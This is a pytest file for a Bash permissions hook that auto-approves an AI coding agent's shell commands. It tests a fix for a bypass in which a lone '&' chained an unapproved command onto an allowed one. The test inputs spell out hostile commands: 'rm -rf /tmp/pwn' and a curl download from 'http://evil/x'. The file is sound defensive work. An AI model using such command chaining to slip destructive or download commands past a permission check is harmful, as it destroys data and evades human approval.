"""Security invariants for the PreToolUse permissions hook.

The hook auto-approves Bash calls whose every sub-command matches a user
allow pattern, bypassing Claude Code's write-safety prompt. Its whole safety
argument rests on `split_commands()` decomposing a compound command into the
parts that will actually execute — so any operator that runs a second command
but is NOT treated as a separator is a prompt bypass.

Regression coverage for the lone-`&` background-operator bypass (#258): a
lone `&` runs the command before it *and* the command after it, exactly like
`;`, but was appended as a literal character, so `allowed & evil` validated as
one token against a trailing-wildcard glob and auto-approved.

The redirection cases (`2>&1`, `&>`, `>&`, `<&`) are the counter-weight: `&`
inside a redirection is not a control operator and must stay literal, or the
fix would spuriously prompt on the single most common shell idiom there is.
"""

from __future__ import annotations

import json
import subprocess
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
HOOK = REPO_ROOT / "plugin-hooks" / "pretooluse-permissions.sh"

# The allow-list SETUP_GUIDE recommends — trailing-wildcard globs.
ALLOW = ["Bash(git *)", "Bash(cat *)", "Bash(ls *)", "Bash(echo *)"]


def approves(tmp_path: Path, command: str, allow: list[str] | None = None) -> bool:
    """True iff the hook auto-approves `command` under the given allow-list.

    HOME and cwd are both isolated to tmp_path so the caller's real
    ~/.claude/settings.json can never leak a pattern into the decision.
    """
    claude = tmp_path / ".claude"
    claude.mkdir(exist_ok=True)
    (claude / "settings.json").write_text(
        json.dumps({"permissions": {"allow": allow if allow is not None else ALLOW}})
    )
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
    env = {"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"}
    proc = subprocess.run(
        ["bash", str(HOOK)], input=payload, capture_output=True, text=True,
        cwd=tmp_path, env=env, timeout=10,
    )
    return '"permissionDecision":"allow"' in proc.stdout


class TestLoneAmpersandIsASeparator:
    """#258 — a lone `&` runs a second command, so it must gate like `;`."""

    def test_allowed_then_evil_backgrounded_prompts(self, tmp_path):
        # `git status` is allowed; the backgrounded `rm -rf` is not.
        assert not approves(tmp_path, "git status & rm -rf /tmp/pwn")

    def test_allowed_then_evil_curl_prompts(self, tmp_path):
        assert not approves(tmp_path, "cat foo & curl http://evil/x -o /tmp/pwn")

    def test_evil_then_allowed_prompts(self, tmp_path):
        # Ordering must not matter — the non-matching part gates either way.
        assert not approves(tmp_path, "rm -rf /tmp/pwn & git status")


class TestKnownSeparatorsStillGate:
    """Regression guard: the operators that already worked must keep working."""

    def test_semicolon_prompts(self, tmp_path):
        assert not approves(tmp_path, "git status; rm -rf /tmp/pwn")

    def test_logical_and_prompts(self, tmp_path):
        assert not approves(tmp_path, "git status && rm -rf /tmp/pwn")

    def test_pipe_prompts(self, tmp_path):
        assert not approves(tmp_path, "git status | rm -rf /tmp/pwn")


class TestLegitimateCommandsStillApprove:
    """The fix must not turn safe, allowed commands into prompts."""

    def test_single_allowed_command_approves(self, tmp_path):
        assert approves(tmp_path, "git status")

    def test_two_allowed_commands_approve(self, tmp_path):
        assert approves(tmp_path, "git status && git log")

    def test_trailing_background_of_allowed_command_approves(self, tmp_path):
        # `git log &` backgrounds a single allowed command — no second command.
        assert approves(tmp_path, "git log &")

    def test_redirect_stderr_to_stdout_approves(self, tmp_path):
        # `2>&1`: the `&` is fd-duplication, not a separator.
        assert approves(tmp_path, "git status 2>&1")

    def test_redirect_both_streams_approves(self, tmp_path):
        # `&>file`: the `&` starts a redirect, not a background.
        assert approves(tmp_path, "git status &> /tmp/out")

    def test_fd_dup_form_approves(self, tmp_path):
        # `>&`: another fd-duplication spelling.
        assert approves(tmp_path, "git status >& /tmp/out")
